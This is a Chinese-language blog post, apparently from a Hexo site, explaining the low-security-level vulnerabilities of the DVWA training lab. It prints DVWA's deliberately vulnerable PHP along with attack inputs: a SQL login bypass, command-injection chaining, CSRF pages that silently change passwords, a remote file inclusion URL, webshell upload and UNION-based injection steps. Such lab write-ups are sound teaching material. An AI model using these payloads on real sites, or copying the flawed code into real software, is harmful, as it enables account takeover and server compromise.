@@ -1,0 +1,1339 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="LINK">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="LINK">
+    <meta name="keywords" content="Hexo | LINK">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>基于DVWA的web漏洞原理-low · my world</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180630 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180630 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 7.0.0-rc2"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >LINK</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">基于DVWA的web漏洞原理-low</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>LINK</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            基于DVWA的web漏洞原理-low
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "dvwa">dvwa</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">4.3k</span> / Reading time: <span class="post-count">19 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/07/19</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>php看的我眼睛都瞎了</p>
+<span id="more"></span>
+
+
+<h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><p>暴力破解 <br /><br>核心代码：</p>
+<pre><code>&lt;?php
+if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;
+    // 获取用户名
+    $user = $_GET[ &#39;username&#39; ];
+    // 获取密码
+    $pass = $_GET[ &#39;password&#39; ];
+    //用md5加密
+    $pass = md5( $pass );
+
+    // 连接数据库
+    $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;
+    //将结果保存到结果集中，如果错误，则输出一条错误信息并退出脚本
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+    
+    //判断结果集是否为1
+    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;
+        // 获取数据库中的用户信息
+        $row    = mysqli_fetch_assoc( $result );
+        $avatar = $row[&quot;avatar&quot;];
+
+        // 登录成功
+        $html .= &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;
+        $html .= &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;
+    &#125;
+    else &#123;
+        // 登录失败
+        $html .= &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;
+    &#125;
+        
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+?&gt;
+</code></pre>
+<p>服务器对输入的username与password没有做限制，这就存在sql注入漏洞 <br /><br>关键点在于<br><code>&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;</code> <br /><br>这条语句 <br /><br>当用户输入的username的值为admin’ or ‘1’&#x3D;’1时，整条语句就会变为<br><code>&quot;SELECT * FROM &#39;users&#39; WHERE user = &#39;admin&#39; or &#39;1&#39;=&#39;1&#39; AND password = &#39;$pass&#39;;&quot;</code><br>这条语句的逻辑为当user为admin或者当1&#x3D;1为真时，整条语句为真 <br /><br>然而1&#x3D;1永远为真，所以整条语句为真 <br /><br>语句返回一个true，即1，存到结果集中，这与输入正确的用户名和密码导致的结果是一样的 <br /><br>结果就是攻击者不需要知道admin的密码就登录了admin的账号</p>
+<h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><p>远程命令注入 <br /><br>核心代码：</p>
+<pre><code>&lt;?php 
+
+if( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123; 
+    // 获取输入的值 
+    $target = $_REQUEST[ &#39;ip&#39; ]; 
+
+    // 确定操作系统并执行ping命令 
+    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123; 
+        // Windows 
+        $cmd = shell_exec( &#39;ping  &#39; . $target ); 
+    &#125; 
+    else &#123; 
+        // linux 
+        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); 
+    &#125; 
+
+    // 反馈给用户 
+    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; 
+&#125; 
+
+?&gt; 
+</code></pre>
+<blockquote>
+<p>stristr（）函数在php中为忽略大小写 <br /><br>php_uname（）函数返回运行php系统有关的信息，参数s为返回系统的名称 <br /></p>
+</blockquote>
+<p>原理也是过滤不严，没有对输入的值进行检查 <br /><br>直接在输入的ip地址后面加上&amp;、&amp;&amp;、|、||，加上自己想要执行的命令就行 <br /></p>
+<h2 id="拼接符号"><a href="#拼接符号" class="headerlink" title="拼接符号"></a>拼接符号</h2><p>A &amp; B   简单的拼接，AB之间并无制约关系 <br /><br>A &amp;&amp; B  A执行成功才会执行B <br /><br>A | B   A的输出作为B的输入 <br /><br>A || B  A执行失败才会执行B <br /></p>
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>ipconfig 查看本地网络 <br /><br>net  user   查看系统用户 <br /><br>dir  查看当前目录 <br /><br>find 查找包含指定字符的行 <br /><br>whoami 查看系统当前有效用户名 <br /></p>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>跨站点请求伪造 <br /><br>核心代码：</p>
+<pre><code>&lt;?php 
+
+if( isset( $_GET[ &#39;Change&#39; ] ) ) &#123; 
+    // 获取输入的值
+    $pass_new  = $_GET[ &#39;password_new&#39; ]; 
+    $pass_conf = $_GET[ &#39;password_conf&#39; ]; 
+
+    // 检测密码是否匹配 
+    if( $pass_new == $pass_conf ) &#123; 
+        // 匹配成功 
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); 
+        $pass_new = md5( $pass_new ); 
+
+        // 更新数据库 
+        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;; 
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+        // 反馈给用户 
+        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; 
+    &#125; 
+    else &#123; 
+        // 密码不匹配 
+        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; 
+    &#125; 
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); 
+&#125; 
+
+?&gt; 
+</code></pre>
+<h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>CSRF通过伪装来自受信任用户的请求来访问受信任的网站 <br /><br>1.当用户A访问了受信任的网站B <br /><br>2.在打开B网页没有关闭的情况下又去访问了C <br /><br>3.C利用A在B中未过期的cookie，发出一些请求代码来访问B <br /><br>4.这样C就能在A不知情的情况下利用A的身份访问了B <br /><br>而在上面的核心代码中，服务器收到请求后，只会检查两次输入的密码是否相同，没有任何防御CSRF的机制 <br /></p>
+<h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="构造url"><a href="#构造url" class="headerlink" title="构造url"></a>构造url</h3><p><code>http://localhost:8888/dvwa/vulnerabilities/csrf/password_new=password&amp;password_conf=password&amp;Change=Change#</code><br>当受害者点击了这个url，他的密码就会被改成password <br /><br>然而实际运用中，受害者点击这个url之后就会返回一个修改密码成功的界面，所以这个方法并不好用 <br /></p>
+<h3 id="构造攻击页面"><a href="#构造攻击页面" class="headerlink" title="构造攻击页面"></a>构造攻击页面</h3><p>在自己的服务器上构造一个html页面</p>
+<pre><code>&lt;img src=&quot;http://localhost:8888/dvwa/vulnerabilities/csrf/??
+
+password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;
+
+&lt;h1&gt;404&lt;h1&gt;
+
+&lt;h2&gt;file not found.&lt;h2&gt;
+</code></pre>
+<p>当受害者访问这个页面时，会以为访问了一个失效的url，但实际上密码已经被篡改</p>
+<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><p>文件包含 <br /><br>核心代码：</p>
+<pre><code>&lt;?php 
+
+// 传入选择的参数 
+$file = $_GET[ &#39;page&#39; ]; 
+
+?&gt;
+</code></pre>
+<p>核心代码很简单，由用户选择文件，服务器去包含执行这些文件 <br /><br>服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<h2 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h2><p>构造url：<code>http://localhost:8888/dvwa/vulnerabilities/fi/?page=phpinfo.php</code><br>服务器会将phpinfo的内容显示在页面上</p>
+<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件 <br /><br>在远程服务xx.xx.xx.xx上上传一个文件phpinfo.php <br /><br>内容如下</p>
+<pre><code>&lt;?php
+phpinfo ();
+?&gt;
+</code></pre>
+<p>构造url：<code>http://localhost:8888/dvwa/vulnerabilities/fi/?page=heep://xx.xx.xx.xx/phpinfo.php</code><br>即可访问</p>
+<h1 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h1><p>文件上传 <br /><br>核心代码：</p>
+<pre><code>&lt;?php 
+
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123; 
+    // 上传的路径和文件名
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;; 
+    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); 
+
+    // 文件是否能移动到新位置，用于检查文件是否上传成功
+    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123; 
+        // 不能移动 
+        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;; 
+    &#125; 
+    else &#123; 
+        // 可以移动 
+        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;; 
+    &#125; 
+&#125; 
+
+?&gt; 
+</code></pre>
+<p>对上传的文件没有任何的检查和过滤，只要上传php文件就可以获取服务器的webshell权限</p>
+<h1 id="Insecure-CAPTCHA"><a href="#Insecure-CAPTCHA" class="headerlink" title="Insecure CAPTCHA"></a>Insecure CAPTCHA</h1><p>不安全的验证码 <br /><br>核心代码：</p>
+<pre><code>&lt;?php
+//检查验证码是否正确
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;1&#39; ) ) &#123;
+    // 隐藏验证码窗体
+    $hide_form = true;
+
+    // 获取输入的值
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+
+    // 从第三方获取验证码
+    $resp = recaptcha_check_answer(
+        $_DVWA[ &#39;recaptcha_private_key&#39;],
+        $_POST[&#39;g-recaptcha-response&#39;]
+    );
+
+    // 检查输入的验证码是否正确
+    if( !$resp ) &#123;
+        // 输入的验证码错误
+        $html     .= &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+        return;
+    &#125;
+    else &#123;
+        // 检查输入的两个新密码是否匹配
+        if( $pass_new == $pass_conf ) &#123;
+            // 两个密码匹配
+            $html .= &quot;
+                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;
+                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt;
+                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt;
+                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;
+                &lt;/form&gt;&quot;;
+        &#125;
+        else &#123;
+            // 两个密码不匹配
+            $html     .= &quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;;
+            $hide_form = false;
+        &#125;
+    &#125;
+&#125;
+//当验证码检查通过
+if( isset( $_POST[ &#39;Change&#39; ] ) &amp;&amp; ( $_POST[ &#39;step&#39; ] == &#39;2&#39; ) ) &#123;
+    // 隐藏验证窗体
+    $hide_form = true;
+
+    // 获取输入的值
+    $pass_new  = $_POST[ &#39;password_new&#39; ];
+    $pass_conf = $_POST[ &#39;password_conf&#39; ];
+
+    // 检查密码是否匹配
+    if( $pass_new == $pass_conf ) &#123;
+        // 密码匹配
+        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+        $pass_new = md5( $pass_new );
+
+        // 更新数据库
+        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;
+        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+        // 反馈给用户
+        $html .= &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;
+    &#125;
+    else &#123;
+        // 密码不匹配
+        $html .= &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;
+        $hide_form = false;
+    &#125;
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);
+&#125;
+
+?&gt;
+</code></pre>
+<h2 id="reCAPTCHA验证流程"><a href="#reCAPTCHA验证流程" class="headerlink" title="reCAPTCHA验证流程"></a>reCAPTCHA验证流程</h2><p>客户端的请求验证码的模块先发送请求到google的服务器上 <br /><br>服务器返回验证码 <br /><br>用户发送验证码到网站的服务器 <br /><br>网站服务器将受到的验证码发给google服务器进行核对 <br /></p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="修改参数"><a href="#修改参数" class="headerlink" title="修改参数"></a>修改参数</h3><p>核心代码中，当step验证码通过时，会将step的值从1修改为2 <br /><br>因为中间没有做其他防护，攻击者要做的事很简单，只要用bp抓包，将step的值修改为2就好了 <br /></p>
+<h3 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h3><p>构造html<br>    <html>      </p>
+<pre><code>&lt;body onload=&quot;document.getElementById(&#39;transfer&#39;).submit()&quot;&gt;        
+
+  &lt;div&gt;    
+
+    &lt;form method=&quot;POST&quot; id=&quot;transfer&quot; action=&quot;http://localhost:8888/dvwa/vulnerabilities/captcha/&quot;&gt;     
+
+        &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;password&quot;&gt;
+
+        &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;     
+
+        &lt;input type=&quot;hidden&quot; name=&quot;step&quot; value=&quot;2&quot;      
+
+        &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;        
+
+    &lt;/form&gt;        
+
+  &lt;/div&gt;        
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre>
+<p>受害者访问这个页面密码就会被改掉</p>
+<h1 id="SQL-Injection-Source"><a href="#SQL-Injection-Source" class="headerlink" title="SQL Injection Source"></a>SQL Injection Source</h1><p>sql注入 <br /><br>核心代码:</p>
+<pre><code>&lt;?php 
+
+if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123; 
+    // 获取输入的值
+    $id = $_REQUEST[ &#39;id&#39; ]; 
+
+    // 连接数据库，将查询的结果放入结果集中
+    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;; 
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );
+
+    // 获取结果集中的值 
+    while( $row = mysqli_fetch_assoc( $result ) ) &#123;  
+        $first = $row[&quot;first_name&quot;]; 
+        $last  = $row[&quot;last_name&quot;]; 
+
+        // 显示给用户
+        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; 
+    &#125; 
+
+    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); 
+&#125; 
+
+?&gt; 
+</code></pre>
+<p>原理同暴力破解，因为没有对输入的参数id进行过滤，攻击者可以通过修改id的值来更改sql查询语句，但是实际运用中攻击者是不知道服务器端的查询语句的，这就需要一个个猜了</p>
+<h2 id="手工注入的大致流程"><a href="#手工注入的大致流程" class="headerlink" title="手工注入的大致流程"></a>手工注入的大致流程</h2><h3 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p>可以用2-1、1&#x3D;1之类的逻辑判断来寻找是否有注入点</p>
+<h3 id="2-查询表的列数"><a href="#2-查询表的列数" class="headerlink" title="2.查询表的列数"></a>2.查询表的列数</h3><p>利用order by来判断列数 <br /><br>Order by num来判断 <br /><br>1′ or 1&#x3D;1 order by 2 <br /></p>
+<h3 id="3-联合查询"><a href="#3-联合查询" class="headerlink" title="3.联合查询"></a>3.联合查询</h3><p>知道列名之后开始联合查询 <br /><br>比如列数为2 <br /><br>Union select version(),database()  <br /></p>
